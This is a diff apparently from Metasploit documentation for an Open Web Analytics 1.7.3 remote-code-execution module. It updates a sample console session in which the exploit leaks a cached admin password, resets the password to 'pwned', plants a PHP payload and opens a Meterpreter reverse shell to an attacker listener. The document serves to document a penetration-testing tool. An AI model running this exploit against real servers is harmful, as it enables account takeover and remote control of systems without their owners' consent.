@@ -41,24 +41,25 @@ SSL => false
 msf6 exploit(multi/http/open_web_analytics_rce) > set LHOST 172.22.0.1
 LHOST => 172.22.0.1
 msf6 exploit(multi/http/open_web_analytics_rce) > check
-[+] 127.0.0.1:80 - The target is vulnerable.
+[*] 127.0.0.1:80 - The target appears to be vulnerable. Open Web Analytics 1.7.3 is vulnerable
 msf6 exploit(multi/http/open_web_analytics_rce) > run
 
 [*] Started reverse TCP handler on 172.22.0.1:4444 
-[+] Connected to http://127.0.0.1:80/ successfully!
+[+] Connected to http://127.0.0.1/ successfully!
 [*] Attempting to find cache of 'admin' user
-[+] Found temporary password for user 'admin': b42f457df9d9482324ca8fe041f19f1c
+[+] Found temporary password for user 'admin': ba47fd0842cfb8e0109ca34e7806b84c
 [+] Changed the password of 'admin' to 'pwned'
 [+] Logged in as admin user
 [*] Creating log file
 [+] Wrote payload to file
 [*] Sending stage (39927 bytes) to 172.22.0.3
-[*] Meterpreter session 3 opened (172.22.0.1:4444 -> 172.22.0.3:47728) at 2023-03-09 13:55:58 +0100
+[*] Meterpreter session 2 opened (172.22.0.1:4444 -> 172.22.0.3:47916) at 2023-03-11 17:22:04 +0100
 [+] Triggering payload! Check your listener!
-[*] You can trigger the payload again at http://127.0.0.1:80/owa-data/caches/ERaG8bho.php
+[*] You can trigger the payload again at http://127.0.0.1/owa-data/caches/p85iCBRq.php
 
 meterpreter > pwd
 /var/www/html/owa-data/caches
 meterpreter > getuid
 Server username: www-data
+meterpreter >
 ```
